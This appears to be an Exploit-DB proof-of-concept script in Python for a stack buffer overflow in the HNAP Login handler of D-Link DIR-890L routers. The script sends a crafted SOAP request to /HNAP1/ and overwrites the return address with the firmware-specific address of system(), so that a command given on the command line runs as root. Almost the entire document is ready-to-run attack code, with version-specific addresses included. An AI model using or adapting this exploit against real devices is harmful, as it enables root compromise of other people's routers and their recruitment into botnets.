# Due to error in hnap protocol implementation we can overflow stack and execute any sh commands under root priviliges.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/hnap.py

import requests as rq
import struct
import sys

IP = sys.argv[1]
PORT = sys.argv[2]
# Can differ in different version of routers and versions of firmware
# SYSTEM_ADDRESS = 0x1B570 # DIR-890L_REVA_FIRMWARE_PATCH_v1.11B02.BETA01
SYSTEM_ADDRESS = 0x1B50C	# DIR-890L_REVA_FIRMWARE_1.10.B07 

def _str(address):
    return struct.pack("<I", address) if address > 0 else struct.pack("<i", address)

url = 'http://{ip}:{port}/HNAP1/'.format(ip=IP, port=PORT)

headers_text = {
    'SOAPACTION' : 'http://purenetworks.com/HNAP1/Login',
    'CONTENT-TYPE' : 'text/html'
}
payload = sys.argv[3]

print(b"<Action>" + payload + b"A" * (0x400 - len(payload)) + _str(-1) + b"C" * 0x14 + _str(SYSTEM_ADDRESS)[0:3] + b"</Action>")

print(rq.post(url, data=b"<Action>" + payload + b"A" * (0x400 - len(payload)) + _str(-1) + b"C" * 0x14 + _str(SYSTEM_ADDRESS)[0:3] + b"</Action>", headers=headers_text).text)